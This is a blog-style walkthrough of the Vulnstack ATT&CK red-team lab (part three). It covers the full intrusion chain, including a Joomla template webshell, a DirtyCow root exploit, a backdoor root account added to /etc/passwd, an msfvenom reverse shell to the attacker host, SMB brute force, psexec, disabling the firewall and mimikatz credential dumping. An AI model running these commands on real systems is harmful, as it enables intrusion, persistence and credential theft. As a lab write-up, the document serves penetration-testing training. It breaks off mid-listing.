---
layout: config.default_layout
title: Vulnstack-ATT&CK红队评估实战靶场(三)
date: 2025-04-04 00:33:47
updated: 2025-04-04 00:34:56
comments: true
tags: [Vulnstack,Windows靶机,综合靶场]
categories: 靶机
---

# ATT&CK红队评估实战靶场(三)

> http://vulnstack.qiyuanxuetang.net/vuln/detail/5/
> 

## 靶场搭建

1. 修改仅主机网卡 A IP为`192.168.93.0` ，然后在添加一张仅主机网卡B，ip随意，我这里为`192.168.213.0` 网段
2. web主机网卡内网设置网卡 A，出口网卡为网卡B
3. 其余主机网卡都是仅主机网卡 A
4. 内网测试，访问web主机服务是否正常

**目标：域控中存在一份重要文件。**

## 主机发现端口扫描

1. 扫描网段内存活主机
    
    ```python
    nmap -sP 192.168.213.0/24                                      
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:37 CST
    Nmap scan report for 192.168.213.1
    Host is up (0.000072s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.213.2
    Host is up (0.00011s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.213.130
    Host is up (0.00025s latency).
    MAC Address: 00:0C:29:32:46:C9 (VMware)
    Nmap scan report for 192.168.213.254
    Host is up (0.00012s latency).
    MAC Address: 00:50:56:F1:A9:3F (VMware)
    Nmap scan report for 192.168.213.129
    ```
    
    根据靶机是我添加的最后一台靶机，所以靶机IP是`156` ，`kali` 的IP是`150`
    
2. 扫描靶机端口
    
    ```python
    nmap -sT -min-rate 10000 -p- 192.168.213.130
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:38 CST
    Nmap scan report for 192.168.213.130
    Host is up (0.00057s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql
    MAC Address: 00:0C:29:32:46:C9 (VMware)
    ```
    
    `SSH`，`WEB`，`MYSQL`端口
    
3. 扫描主机服务版本以及系统版本
    
    ```python
    nmap -sV -sT -O -p 22,80,3306 192.168.213.130                  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:39 CST
    Nmap scan report for 192.168.213.130
    Host is up (0.00037s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
    80/tcp   open  http    nginx 1.9.4
    3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1
    MAC Address: 00:0C:29:32:46:C9 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X|3.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
    OS details: Linux 2.6.32 - 3.10
    ```
    
4. 扫描主机服务漏洞，使用`nmap`扫描
    
    ```python
    nmap -script=vuln -p 22,80,3306 192.168.213.130                                                                                                                                                               
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 13:39 CST                                                                                                                                                
    Nmap scan report for 192.168.213.130                                                                                                                                                                              
    Host is up (0.00049s latency).                                                                                                                                                                                    
                                                                                                                                                                                                                      
    PORT     STATE SERVICE                                                                                                                                                                                            
    22/tcp   open  ssh                                                                                                                                                                                                
    80/tcp   open  http                                                                                                                                                                                               
                   
    | http-dombased-xss:                                
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.213.130                          
    |   Found the following indications of potential DOM based XSS:                                          
    |                                                   
    |     Source: window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no')
    |_    Pages: http://192.168.213.130:80/, http://192.168.213.130:80/, http://192.168.213.130:80/, http://192.168.213.130:80/, http://192.168.213.130:80/index.php/3-welcome-to-your-blog, http://192.168.213.130:80                                        
    | http-enum:                                        
    |   /administrator/: Possible admin folder          
    |   /administrator/index.php: Possible admin folder                                                      
    |   /robots.txt: Robots file                        
    |   /administrator/manifests/files/joomla.xml: Joomla version 3.9.12                                     
    |   /language/en-GB/en-GB.xml: Joomla version 3.9.12                                                     
    |   /htaccess.txt: Joomla!                          
    |   /README.txt: Interesting, a readme.             
    |   /bin/: Potentially interesting folder           
    |   /cache/: Potentially interesting folder         
    |   /images/: Potentially interesting folder        
    |   /includes/: Potentially interesting folder      
    |   /libraries/: Potentially interesting folder     
    |   /modules/: Potentially interesting folder       
    |   /templates/: Potentially interesting folder     
    |_  /tmp/: Potentially interesting folder           
    3306/tcp open  mysql                                
    |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)                              
    MAC Address: 00:0C:29:32:46:C9 (VMware)             
    
    Nmap done: 1 IP address (1 host up) scanned in 75.86 seconds 
    ```
    
    `80`端口枚举出很多路径，以及CMS估计是`Joomla` ，`3306`端口发现`cve2012-2122` ，但是脚本注入失败
    
    优先级：`80`>`3306`>`22`
    

## WEB渗透

1. 访问主页，网站指纹识别
    
    ![image.png](image39.png)
    
    当前网站CMS是`Joomla 3.9.12`，`Nginx`，并且是反向代理的
    
2. 扫描一下网站目录
    
    ```python
    dirsearch -u http://192.168.213.130 -x 403,404 -e php,zip,html,txt                                                                                                             
    //                                                                                                             
    [13:53:25] Starting:                                                                                         
    [13:53:30] 200 -   24KB - /1.php                                                                                                                                                      
    [13:53:38] 301 -  326B  - /administrator  ->  http://192.168.213.130/administrator/                          
    [13:53:38] 200 -    2KB - /administrator/                                                                    
    [13:53:38] 200 -  527B  - /administrator/includes/                                                           
    [13:53:38] 200 -   31B  - /administrator/cache/                                                              
    [13:53:38] 200 -   31B  - /administrator/logs/                                                               
    [13:53:38] 200 -    2KB - /administrator/index.php                                                           
    [13:53:38] 301 -  331B  - /administrator/logs  ->  http://192.168.213.130/administrator/logs/                
    [13:53:42] 301 -  316B  - /bin  ->  http://192.168.213.130/bin/                                              
    [13:53:42] 200 -   31B  - /bin/                                                                              
    [13:53:43] 301 -  318B  - /cache  ->  http://192.168.213.130/cache/                                          
    [13:53:43] 200 -   31B  - /cache/                                                                            
    [13:53:44] 200 -   31B  - /cli/                        
    [13:53:44] 301 -  323B  - /components  ->  http://192.168.213.130/components/
    [13:53:44] 200 -   31B  - /components/                                       
    [13:53:45] 200 -    0B  - /configuration.php           
    [13:53:45] 200 -    2KB - /configuration.php~          
    [13:53:52] 200 -    1KB - /htaccess.txt                
    [13:53:53] 301 -  319B  - /images  ->  http://192.168.213.130/images/
    [13:53:53] 200 -   31B  - /images/                                                                           
    [13:53:53] 301 -  321B  - /includes  ->  http://192.168.213.130/includes/                                                                                                                                         
    [13:53:53] 200 -   31B  - /includes/                                     
    [13:53:53] 200 -    4KB - /index.php           
    [13:53:53] 200 -    3KB - /index.php/login/                                                                  
    [13:53:55] 301 -  321B  - /language  ->  http://192.168.213.130/language/                                    
    [13:53:55] 200 -   31B  - /layouts/                                                                          
    [13:53:56] 301 -  322B  - /libraries  ->  http://192.168.213.130/libraries/                                  
    [13:53:56] 200 -   31B  - /libraries/                                                                        
    [13:53:56] 200 -    7KB - /LICENSE.txt                                                                       
    [13:53:58] 301 -  318B  - /media  ->  http://192.168.213.130/media/                                          
    [13:53:58] 200 -   31B  - /media/                                                                            
    [13:53:59] 301 -  320B  - /modules  ->  http://192.168.213.130/modules/                                      
    [13:53:59] 200 -   31B  - /modules/                                                                          
    [13:54:05] 301 -  320B  - /plugins  ->  http://192.168.213.130/plugins/                                      
    [13:54:05] 200 -   31B  - /plugins/                                                                          
    [13:54:07] 200 -    2KB - /README.txt                                                                        
    [13:54:08] 200 -  392B  - /robots.txt                                                                        
    [13:54:14] 301 -  322B  - /templates  ->  http://192.168.213.130/templates/                                  
    [13:54:14] 200 -   31B  - /templates/                                                                        
    [13:54:14] 200 -   31B  - /templates/index.html                                                              
    [13:54:14] 200 -    0B  - /templates/beez3/                                                                  
    [13:54:14] 200 -    0B  - /templates/protostar/        
    [13:54:14] 200 -    0B  - /templates/system/                                 
    [13:54:15] 301 -  316B  - /tmp  ->  http://192.168.213.130/tmp/              
    [13:54:15] 200 -   31B  - /tmp/                        
    [13:54:19] 200 -  628B  - /web.config.txt         
    ```
    
    - `1.php` 是`phpinfo`
    - `/administrator` 登陆页面
    - `/configuration.php~` `Joomle`的配置文件
        
        嗯？还有回显，访问得到如下信息
        
        ```python
        è¯·ç¨å€™è®¿é—®ã€‚';
        	public $display_offline_message = '1';
        	public $offline_image = '';
        	public $sitename = 'test';
        	public $editor = 'tinymce';
        	public $captcha = '0';
        	public $list_limit = '20';
        	public $access = '1';
        	public $debug = '0';
        	public $debug_lang = '0';
        	public $debug_lang_const = '1';
        	public $dbtype = 'mysqli';
        	public $host = 'localhost';
        	public $user = 'testuser';
        	public $password = 'cvcvgjASD!@';
        	public $db = 'joomla';
        	public $dbprefix = 'am2zu_';
        	public $live_site = '';
        	public $secret = 'gXN9Wbpk7ef3A4Ys';
        	public $gzip = '0';
        	public $error_reporting = 'default';
        	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        	public $ftp_host = '';
        	public $ftp_port = '';
        	public $ftp_user = '';
        	public $ftp_pass = '';
        	public $ftp_root = '';
        	public $ftp_enable = '0';
        	public $offset = 'UTC';
        	public $mailonline = '1';
        	public $mailer = 'mail';
        	public $mailfrom = 'test@test.com';
        	public $fromname = 'test';
        	public $sendmail = '/usr/sbin/sendmail';
        	public $smtpauth = '0';
        	public $smtpuser = '';
        	public $smtppass = '';
        	public $smtphost = 'localhost';
        	public $smtpsecure = 'none';
        	public $smtpport = '25';
        	public $caching = '0';
        	public $cache_handler = 'file';
        	public $cachetime = '15';
        	public $cache_platformprefix = '0';
        	public $MetaDesc = '';
        	public $MetaKeys = '';
        	public $MetaTitle = '1';
        	public $MetaAuthor = '1';
        	public $MetaVersion = '0';
        	public $robots = '';
        	public $sef = '1';
        	public $sef_rewrite = '0';
        	public $sef_suffix = '0';
        	public $unicodeslugs = '0';
        	public $feed_limit = '10';
        	public $feed_email = 'none';
        	public $log_path = '/var/www/html/administrator/logs';
        	public $tmp_path = '/var/www/html/tmp';
        	public $lifetime = '15';
        	public $session_handler = 'database';
        	public $shared_session = '0';
        }
        ```
        
        得到了数据库账号`testuser`密码`cvcvgjASD!@` ，以及网站的根目录`/var/www/html/`
        
3. 尝试登录MYSQL，使用`Navicat`
    
    ![image.png](image40.png)
    
    登陆成功
    
4. 进入数据库后台后，查找敏感数据
    
    找到后台管理员的数据，在`am2zu_users` 表下
    
    ```python
    891	Super User	administrator	test@test.com	$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2
    ```
    
    尝试使用`john`破解，但是无果，尝试修改`MYSQL`表文件
    
5. 将得到的后台管理员密码拿去识别得知是**Bcrypt**加密，是为了抗爆发明的，所以john破解无果（太慢了）
    
    我们将123456进行**Bcrypt**加密，得到
    
    > 加密网站：https://www.bejson.com/encrypt/bcrpyt_encode/
    > 
    
    ```python
    $2a$10$JYEZiw0pCY1NV9ZVsaJ39uAgaXUpzCvaFxvBDPwMBlQEkYmD7RXPi
    ```
    
    然后将其替换到`administrator`上去，登陆后台，成功进入后台
    

## 后台利用

1. 使用账号`administrator`密码`123456`登录后台
    
    ![image.png](image41.png)
    
2. 获取到系统信息
    
    ```python
    Setting 	Value
    PHP Built On 	Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
    Database Type 	mysql
    Database Version 	5.7.27-0ubuntu0.16.04.1
    Database Collation 	utf8_general_ci
    Database Connection Collation 	utf8mb4_general_ci
    PHP Version 	7.1.32-1+ubuntu16.04.1+deb.sury.org+1
    Web Server 	Apache/2.4.18 (Ubuntu)
    WebServer to PHP Interface 	apache2handler
    Joomla! Version 	Joomla! 3.9.12 Stable [ Amani ] 24-September-2019 15:00 GMT
    Joomla! Platform Version 	Joomla Platform 13.1.0 Stable [ Curiosity ] 24-Apr-2013 00:00 GMT
    User Agent 	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0 
    ```
    
3. 通过模板`getshell`
    
    修改模板`Extensions`–>`Templates`–>`Templates`–>`Beez3 Details and Files` 的`error.php`文件，将内容替换为一句木马
    
    ![image.png](image42.png)
    
4. 访问`error.php`文件
    
    ```python
    /templates/beez3/error.php
    ```
    
5. 使用蚁🗡连接，连接成功
    
    ![image.png](image43.png)
    

## 获得shell ？

1. 利用蚁🗡进行反弹`shell`
    
    ![image.png](image44.png)
    
    返回`ret=127`
    
2. 寻找原因，查看之前的`1.php`
    
    ![image.png](image45.png)
    
    将执行函数禁用了（我前面使用`MSF`生成反弹`shell`代码一直不成功都怀疑自己了，原来是这里卡住了）
    
3. 绕过**Disable Functions**
    
    > https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
    > 
    
    将`bypass_disablefunc.php`和`bypass_disablefunc_x64.so`通过蚁🗡上传到当前目录
    
    测试，输入`url`测试`pwd`命令
    
    ```python
    ?cmd=pwd&outpath=/var/www/html/output&sopath=/var/www/html/bypass_disablefunc_x64.so
    ```
    
    ![image.png](image46.png)
    
4. 尝试了反弹`shell`但是没有成功

## 内网信息收集

1. 蚁🗡由绕过**Disable Functions**的插件，安装后虚拟终端可以正常回显
    
    > https://github.com/Medicean/as_bypass_php_disable_functions
    > 
2. 信息收集
    
    ```python
    (www-data:/var/www/html/templates/beez3) $ ip add
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:ab:32:ac brd ff:ff:ff:ff:ff:ff
        inet 192.168.93.120/24 brd 192.168.93.255 scope global ens33
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:feab:32ac/64 scope link 
           valid_lft forever preferred_lft forever
    ```
    
    确定web服务器的IP是`192.168.93.120`
    
    ```python
    (www-data:/var/www/html/templates/beez3) $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    (www-data:/var/www/html/templates/beez3) $ whoami
    www-data
    (www-data:/var/www/html/templates/beez3) $ uname -a
    Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
3. 寻找敏感内容
    - `/tmp`下存在`test.txt` ，像是一个用户
        
        ```python
        (www-data:/tmp/mysql) $ cat test.txt
        adduser wwwuser
        passwd wwwuser_123Aqx
        ```
        
4. 拿到一个用户的信息，我们尝试登录`ssh` ，登陆成功
    
    ```python
    ssh wwwuser@192.168.213.130 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
    wwwuser@192.168.213.130's password:
    Last login: Sun Oct  6 20:24:43 2019 from 192.168.1.122
    [wwwuser@localhost ~]$  
    ```
    
    查看其IP信息
    
    ```python
    [wwwuser@localhost ~]$ ip add
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:32:46:c9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.213.130/24 brd 192.168.213.255 scope global eth0
        inet6 fe80::20c:29ff:fe32:46c9/64 scope link 
           valid_lft forever preferred_lft forever
    3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:32:46:d3 brd ff:ff:ff:ff:ff:ff
        inet 192.168.93.100/24 brd 192.168.93.255 scope global eth1
        inet6 fe80::20c:29ff:fe32:46d3/64 scope link 
           valid_lft forever preferred_lft forever
    ```
    
    两张网卡，可以知道这个是`nginx`服务器的主机，用来做反向代理的，内网IP是`192.168.93.100`
    
5. 查看代理配置`/etc/nginx/nginx.conf`
    
    ```python
    http {                                                                                                                                                                                                                                                                                                                                                                                                                            
      server {                                                                                                                                                                                                                                                                                                                                                                                                                       
            listen  80;                                                                                                                                                                                               
            server_name  localhost;                                                                                                                                                                                                                                                                                                                                                                                              
            location / {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
             proxy_pass  http://192.168.93.120;                                                                                                                                                                                                                                                                                                                                                                                 
                  proxy_set_header        Host $host;                                                                                                                                                                 
                  proxy_set_header        X-Real-IP $remote_addr;  #获取真实ip                                                                                                                                        
                  proxy_connect_timeout   90;                                                                                                                                                                         
                  proxy_send_timeout      90;                                                                                                                                                                         
                  proxy_read_timeout      90;
                  proxy_buffer_size       4k;
                  proxy_buffers           4 32k;
                  proxy_busy_buffers_size 64k;
                  proxy_temp_file_write_size 64k;
                  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#获取代理者的真实ip
                  proxy_redirect          off;
    }
    }
    }
    stream  {                                                                                                                                                                                                                                                                                                                                                                                                                         
    upstream proxy_name {                                                                                                                                                                                                                                                                                                                                                                                                             
        server 192.168.93.120:3306;                                                                                                                                                                                                                                                                                                                                                                                                 
    }                                                                                                                                                                                                                                                        
    server {                                                                          
        listen 3306;                                                                   
        proxy_pass proxy_name;                                                                                                                    
    }                                                
    }
    ```
    

## 提权

1. 尝试提权`nginx`主机，方便后续操作，查看内核`2.6.32`在脏牛(`DirtyCow`)(`CVE-2016-5195`)的范围内
    
    ```python
    [wwwuser@localhost tmp]$ uname -a
    Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
2. `EXP`地址https://github.com/FireFart/dirtycow
    
    将EXP传到靶机上去，然后编译执行
    
    ```python
    gcc -pthread dirty.c -o dirty -lcrypt
    ./dirty 123456
    ```
    
    ```python
    [wwwuser@localhost tmp]$ ./dirty 123456 
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password: 123456
    Complete line:
    firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
    
    mmap: 7f141f280000
    
    madvise 0
    
    ptrace 0
    Done! Check /etc/passwd to see if the new user was created.
    You can log in with the username 'firefart' and the password '123456'.
    
    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd   
    ```
    
    创建了一个新用户`firefart`，密码是`123456`
    
3. 切换账户查看权限
    
    ```python
    [firefart@localhost tmp]# id
    uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    ```
    
    root！！！
    
4. 添加新的超级管理员用户（权限维持，不过很明显）
    
    ```python
    echo "sunset:savbSWc4rx8NY:0:0::/:/bin/sh" >> passwd.bak
    ```
    
    密码是`momaek` ，新建后将`mv /tmp/passwd.bak /etc/passwd` `DON'T FORGET TO RESTORE!`
    
    之后就可以登录`sunset`用户来操作了
    

## 上线MSF

1. 生成`payload`
    
    ```python
    msfvenom -p python/meterpreter/reverse_tcp lport=1234 lhost=192.168.213.129 -f raw > getshell.py
    ```
    
2. 将`getshell.py` 上传到靶机，`kali`开启监听，执行`getshell.py`
    
    ```python
    # kali 开启监听
    msf6 > use exploit/multi/handler 
    msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lport 1234  
    msf6 exploit(multi/handler) > set lhost 192.168.213.129 
    msf6 exploit(multi/handler) > run 
    ```
    
    ```python
    # 靶机执行文件
    -sh-4.1# python getshell.py 
    ```
    
    ```python
    msf6 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 192.168.213.129:1234 
    [*] Sending stage (24772 bytes) to 192.168.213.130
    [*] Meterpreter session 2 opened (192.168.213.129:1234 -> 192.168.213.130:42433) at 2024-11-25 22:30:03 +0800
    
    meterpreter > 
    ```
    
    上线成功
    

## 内网主机&信息探测

1. 上线`MSF`后，添加通向内网的路由
    
    ```python
    meterpreter > run post/multi/manage/autoroute
    meterpreter > run autoroute -p
    
    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    
    Active Routing Table
    ====================
    
       Subnet             Netmask            Gateway
       ------             -------            -------
       169.254.0.0        255.255.0.0        Session 1
       192.168.93.0       255.255.255.0      Session 1
       192.168.213.0      255.255.255.0      Session 1
    ```
    
2. 使用**`Earthworm`**在`kali`和`Centos`中建立一条隧道
    
    > https://rootkiter.com/EarthWorm/
    > 
    
    `earthworm`搭建`socks5`反向代理服务 是为了让kali（攻击者）的程序进入内网，可以扫描内网主机信息等
    
    ew流量走向：本地流量–本地`1080`端口–web服务器`8888`端口（利用EW）-- 内网服务器 – web服务器的`8888`端口 – 本地`1080`端口
    
    - Kali（此处用的是反向的）
        
        ```python
        ./ew_for_linux64 -s rcsocks -l 1080 -e 8888
        rcsocks 0.0.0.0:1080 <--[10000 usec]--> 0.0.0.0:8888
        init cmd_server_for_rc here
        start listen port here
        ```
        
    - Centos
        
        ```python
        ./ew_for_linux64 -s rssocks -d 192.168.213.129 -e 8888
        ```
        
    - 设置`proxychain4` ，注意：`proxychain4` 只能代理`TCP`或者`UDP`
        
        ```python
        # vim /etc/proxychains4.conf   
        socks5  127.0.0.1       1080
        ```
        
    
    测试，因为上面通过查看`Nginx`的反向代理配置得知Web服务器为`192.168.93.120` ，我们正常是不可以直接`curl`到内容，但是通过代理后就可以直接`curl`了
    
    ```python
    # 不经过代理
    curl 192.168.93.120             
    curl: (7) Failed to connect to 192.168.93.120 port 80 after 0 ms: Could not connect to server
    # 经过代理
    proxychains4 curl 192.168.93.120     
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.93.120:80  ...  OK
    <!DOCTYPE html>
    <html lang="en-gb" dir="ltr">
    <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <meta charset="utf-8" />
            <base href="http://192.168.93.120/" />
          .....
    ```
    
3. 内网主机探测
    - 进入`Centos`命令行，然后上传`fscan` 来扫描内网
        
        然后将扫描结果存放到`1.txt`
        
        ```python
        ./fscan -h 192.168.93.1/24 > 1.txt 
        ```
        
    - `ICMP`存活主机
        
        ```python
        (icmp) Target 192.168.93.100  is alive
        (icmp) Target 192.168.93.10   is alive
        (icmp) Target 192.168.93.20   is alive
        (icmp) Target 192.168.93.30   is alive
        (icmp) Target 192.168.93.120  is alive
        ```
        
    - 端口扫描
        
        ```python
        192.168.93.120:3306 open
        192.168.93.100:3306 open
        192.168.93.20:1433 open
        192.168.93.30:445 open
        192.168.93.20:445 open
        192.168.93.10:445 open
        192.168.93.30:139 open
        192.168.93.20:139 open
        192.168.93.10:139 open
        192.168.93.10:135 open
        192.168.93.30:135 open
        192.168.93.20:135 open
        192.168.93.20:80 open
        192.168.93.120:80 open
        192.168.93.100:80 open
        192.168.93.100:22 open
        192.168.93.120:22 open
        192.168.93.10:88 open
        ```
        
    - 主机系统
        
        ```python
        [*] NetInfo 
        [*]192.168.93.10
           [->]WIN-8GA56TNV3MV
           [->]192.168.93.10
        [*] NetInfo 
        [*]192.168.93.30
           [->]win7
           [->]192.168.93.30
        [*] NetInfo 
        [*]192.168.93.20
           [->]win2008
           [->]192.168.93.20
        [*] OsInfo 192.168.93.30	(Windows 7 Professional 7601 Service Pack 1)
        [*] OsInfo 192.168.93.10	(Windows Server 2012 R2 Datacenter 9600)
        [*] OsInfo 192.168.93.20	(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)
        [*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2
        [*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600
        [+] mysql 192.168.93.100:3306:root 123
        [+] mysql 192.168.93.120:3306:root 123
        ```
        
        一台`WIN7`，一台`server2008` ，以及`server2012`并且都打开了`445`端口
        
4. 总结当前信息
    
    当前拿下了`Centos`主机`root`权限，以及发现 域内主机`win2008`和`win7` 以及域控`WIN-8GA56TNV3MV` ，并且都开放了`445`端口
    

## SMB 口令爆破

1. 使用MSF的`smb_login`模块进行爆破，尝试爆破`win2008`的
    
    ```python
    msf6 auxiliary(scanner/smb/smb_version) > use uxiliary/scanner/smb/smb_login
    msf6 auxiliary(scanner/smb/smb_login) > set threads 5
    msf6 auxiliary(scanner/smb/smb_login) > set SMBuser administrator
    msf6 auxiliary(scanner/smb/smb_login) > set rhosts 192.168.93.20
    msf6 auxiliary(scanner/smb/smb_login) > set pass_file /root/Desktop/Dict/Blasting_dictionary-master/top10W.txt
    msf6 auxiliary(scanner/smb/smb_login) > run
    
    [*] 192.168.93.20:445     - 192.168.93.20:445 - Starting SMB login bruteforce
    [+] 192.168.93.20:445     - 192.168.93.20:445 - Success: '.\administrator:123qwe!ASD' Administrator
    [!] 192.168.93.20:445     - No active DB -- Credential data will not be saved!
    [*] 192.168.93.20:445     - Scanned 1 of 1 hosts (100% complete)
    [*] 192.168.93.20:445     - Bruteforce completed, 1 credential was successful.
    [*] 192.168.93.20:445     - You can open an SMB session with these credentials and CreateSession set to true
    ```
    
    没想到成功了，的到密码`123qwe!ASD` （这个密码是我自己加上去的，因为我的字典爆破不出来，网上的writeup很多师傅都可以爆破，我就加上了）
    
2. 再使用该密码测试域内其他机器
    
    ```python
    msf6 auxiliary(scanner/smb/smb_login) > set rhosts 192.168.93.30
    msf6 auxiliary(scanner/smb/smb_login) > run
    
    [*] 192.168.93.30:445     - 192.168.93.30:445 - Starting SMB login bruteforce
    [+] 192.168.93.30:445     - 192.168.93.30:445 - Success: '.\administrator:123qwe!ASD' Administrator
    [!] 192.168.93.30:445     - No active DB -- Credential data will not be saved!
    [*] 192.168.93.30:445     - Scanned 1 of 1 hosts (100% complete)
    [*] 192.168.93.30:445     - Bruteforce completed, 1 credential was successful.
    [*] 192.168.93.30:445     - You can open an SMB session with these credentials and CreateSession set to true
    [*] Auxiliary module execution completed
    ```
    
    最后发现`win2008`和`win7`都是同一密码
    

## 使用psexec连接 & 抓取密码

1. 使用MSF里边的模块 连接`192.168.93.20`
    
    ```python
    msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                         
    msf6 exploit(windows/smb/psexec) > set rhosts 192.168.93.20                                 
    msf6 exploit(windows/smb/psexec) > set SMBUSER administrator  
    msf6 exploit(windows/smb/psexec) > set SMBpass 123qwe!ASD                                   
    msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/bind_tcp                 
    msf6 exploit(windows/smb/psexec) > run
    
    [*] 192.168.93.20:445 - Connecting to the server...
    [*] 192.168.93.20:445 - Authenticating to 192.168.93.20:445 as user 'administrator'...
    [*] 192.168.93.20:445 - Selecting PowerShell target
    [*] 192.168.93.20:445 - Executing the payload...
    [+] 192.168.93.20:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Started bind TCP handler against 192.168.93.20:4444
    [*] Sending stage (176198 bytes) to 192.168.93.20
    [*] Meterpreter session 3 opened (192.168.93.100:42597 -> 192.168.93.20:4444 via session 2) at 2024-11-28 14:51:45 +0800                                                                                                                          
    ```
    
2. 查看权限
    
    ```python
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    ```
    
3. 关闭防火墙以及开启远程桌面
    
    ```python
    # 关闭防火墙
    C:\Windows\system32>netsh advfirewall set allprofiles state off
    netsh advfirewall set allprofiles state off
    # 注册表开启3389端口
    C:\Windows\system32>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    The operation completed successfully.
    ```
    
4. 测试连接远程桌面（记得`!`前要加斜杠来转义）
    
    ![image.png](image47.png)
    
    连接成功
    
5. `MSF`加载`mimikatz`来抓取密码
    
    ```python
    C:\Windows\system32>exit
    exit
    meterpreter > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x86/windows)
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
    [!] Loaded x86 Kiwi on an x64 architecture.
    
    Success.
    ```
    
    - `mimikatz` 需要在`x64`下运行，我们ps打印正在运行程序
        
        ```python
        meterpreter > ps
                    
        Process List
        ============  
        
         PID   PPID  Name                          Arch  Session  User                          Path 
         ---   ----  ----                          ----  -------  ----                          ----   
         0     0     [System Process]   
         4     0     System                        x64   0 
         300   616   svchost.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
         320   616   SLsvc.exe                     x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\SLsvc.exe
